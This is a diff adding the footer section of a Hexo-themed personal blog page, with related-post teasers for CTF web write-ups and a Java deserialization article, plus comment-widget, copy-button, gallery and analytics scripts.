+							<p class="relate-post-content">
+								by:Infernity
+ezHTTP请从vidar.club访问这个页面
+在请求头中插入
+referer:vidar.club
+请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWeb...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/01/31/Hgame%202024%20week%201/" title="Hgame 2024 week 1">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 1"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" title="GeekChallenge 2023 WEB赛题目WP">
+								GeekChallenge 2023 WEB赛题目WP			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十一月 28日, 2023				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+EzHttp请post传参username和password进行登录
+第一步先找username和password，查看源码发现“**密码记在了不想让爬虫获取的地方!**”
+查阅资料，
+1几乎所有的搜索引擎爬...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" title="GeekChallenge 2023 WEB赛题目WP">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="https://pic1.zhimg.com/v2-0dda71bc9ced142bf7bb2d6adbebe4f0_r.jpg" alt="GeekChallenge 2023 WEB赛题目WP"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链">
+								JAVA反序列化——CC1链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 2日, 2024				
+							</p>
+							<p class="relate-post-content">
+								前言CC1链有两种写法，我这种写法跟ysoserial里的写法不一样，另一种写法写在另一篇文章。
+cc1链要求java版本小于jdk8u71
+我这里用的JDK版本是8u66
+因为在高版本这条链子最后的annotationInvocat...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC1链"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: '333--',
+			clientSecret: '333--',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'annie-gitalk',
+			owner: 'Sariay',
+			admin: 'Sariay',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by Infernity. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	
+<script src="/plugin/love/love.js"></script>
+
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+  
+<script src="/plugin/leancloud/av-min.js"></script>
+<script src="/js/leancloud-count.js"></script>
+
+
+	
+
+  
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
